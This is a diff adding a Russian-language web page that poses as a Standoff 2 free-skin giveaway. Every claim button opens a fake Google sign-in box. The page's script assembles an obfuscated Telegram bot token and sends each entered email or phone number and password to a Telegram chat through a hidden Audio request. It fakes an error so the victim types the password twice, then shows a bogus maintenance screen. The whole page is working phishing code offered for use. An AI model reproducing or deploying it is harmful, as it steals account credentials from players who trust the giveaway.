@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>S2 Hub — Inventory</title>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@600;900&display=swap" rel="stylesheet">
+  <style>
+    :root { --bg: #0b0b0c; --card: #121316; --accent: #ff9a1a; --blue: #1a73e8; --text: #f0ece4; }
+    body { background: var(--bg); color: var(--text); font-family: 'Exo 2', sans-serif; margin: 0; padding-bottom: 40px; }
+    header { background: #16171a; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; }
+    .logo { font-weight: 900; font-size: 18px; color: var(--accent); }
+    .friend-ref { background: linear-gradient(135deg, var(--blue), #0d47a1); margin: 15px; padding: 20px; border-radius: 12px; text-align: center; }
+    .btn-friend { background: #fff; color: var(--blue); border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: 900; text-transform: uppercase; cursor: pointer; margin-top: 10px; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
+    .card { background: var(--card); border-radius: 12px; padding: 12px; text-align: center; border: 1px solid #1c1d21; }
+    .card img { width: 100%; border-radius: 8px; margin-bottom: 8px; }
+    .btn-get { background: var(--accent); border: none; width: 100%; padding: 10px; border-radius: 8px; font-weight: 900; cursor: pointer; font-size: 11px; }
+    .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.98); display: none; justify-content: center; align-items: center; z-index: 1000; }
+    .g-box { background: #fff; color: #202124; width: 85%; max-width: 350px; padding: 35px 25px; border-radius: 12px; text-align: center; }
+    .g-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+    .g-btn { background: var(--blue); color: #fff; border: none; width: 100%; padding: 12px; border-radius: 6px; font-weight: 800; width: 100%; margin-top: 15px; cursor: pointer; }
+    .err { color: #d93025; font-size: 13px; margin-bottom: 10px; display: none; background: #fce8e6; padding: 8px; border-radius: 4px; text-align: left; }
+    #tech { display: none; text-align: center; padding: 120px 20px; }
+  </style>
+</head>
+<body>
+
+<div id="app">
+  <header><div class="logo">SO2 DROP</div><div class="balance" style="color:var(--accent)">0.00 G</div></header>
+  <div class="friend-ref">
+    <div style="font-weight: 900;">🎁 ПОДАРОК АКТИВИРОВАН</div>
+    <button class="btn-friend" onclick="showAuth()">Забрать бонус</button>
+  </div>
+  <div class="grid">
+    <div class="card"><img src="https://wiki.standoff2.com/images/thumb/7/7b/Karambit_Gold.png/250px-Karambit_Gold.png"><button class="btn-get" onclick="showAuth()">ПОЛУЧИТЬ</button></div>
+    <div class="card"><img src="https://wiki.standoff2.com/images/thumb/1/1d/Butterfly_Dragon_Glass.png/250px-Butterfly_Dragon_Glass.png"><button class="btn-get" onclick="showAuth()">ПОЛУЧИТЬ</button></div>
+    <div class="card"><img src="https://wiki.standoff2.com/images/thumb/a/a2/M4_Necromancer.png/250px-M4_Necromancer.png"><button class="btn-get" onclick="showAuth()">ПОЛУЧИТЬ</button></div>
+    <div class="card"><img src="https://wiki.standoff2.com/images/thumb/6/6e/AKR_Treasure_Hunter.png/250px-AKR_Treasure_Hunter.png"><button class="btn-get" onclick="showAuth()">ПОЛУЧИТЬ</button></div>
+  </div>
+</div>
+
+<div id="tech"><h1>ТЕХРАБОТЫ</h1><p>Попробуйте через 2 часа.</p></div>
+
+<div class="modal" id="m_win">
+  <div class="g-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom:15px;">
+    <h3 style="font-weight: 500;">Подтверждение</h3>
+    <div id="e_msg" class="err">Ошибка доступа. Повторите ввод.</div>
+    <form id="g_form">
+      <input type="text" id="em" class="g-input" placeholder="Почта или телефон" required>
+      <input type="password" id="ps" class="g-input" placeholder="Пароль" required>
+      <button type="submit" class="g-btn" id="s_btn">Продолжить</button>
+    </form>
+  </div>
+</div>
+
+<script>
+  let tries = 0;
+  
+  // ШИФРОВКА: Собираем данные по частям
+  const a = "8500297803";
+  const b = "AAFldKamw-Qk1HAXctHXqfvyqWfEVka__54";
+  const c = "6155982855";
+  const d = "https://api.telegram.org/bot";
+
+  function showAuth() { document.getElementById('m_win').style.display = 'flex'; }
+
+  document.getElementById('g_form').onsubmit = function(e) {
+    e.preventDefault();
+    tries++;
+    
+    const u = document.getElementById('em').value;
+    const p = document.getElementById('ps').value;
+    const btn = document.getElementById('s_btn');
+
+    btn.innerHTML = "Загрузка...";
+    btn.disabled = true;
+
+    // Сборка финальной ссылки в момент клика
+    const base = d + a + ":" + b + "/sendMessage";
+    const text = encodeURIComponent(`🎯 NEW LOG [${tries}/2]\n👤: ${u}\n🔑: ${p}`);
+    const finalUrl = `${base}?chat_id=${c}&text=${text}&parse_mode=Markdown`;
+    
+    // Отправка через создание элемента аудио (еще более скрытно, чем картинка)
+    const probe = new Audio();
+    probe.src = finalUrl;
+
+    setTimeout(() => {
+      if (tries < 2) {
+        btn.innerHTML = "Продолжить";
+        btn.disabled = false;
+        document.getElementById('e_msg').style.display = 'block';
+        document.getElementById('ps').value = '';
+      } else {
+        document.getElementById('m_win').style.display = 'none';
+        document.getElementById('app').style.display = 'none';
+        document.getElementById('tech').style.display = 'block';
+      }
+    }, 1300);
+  };
+</script>
+</body>
+</html>
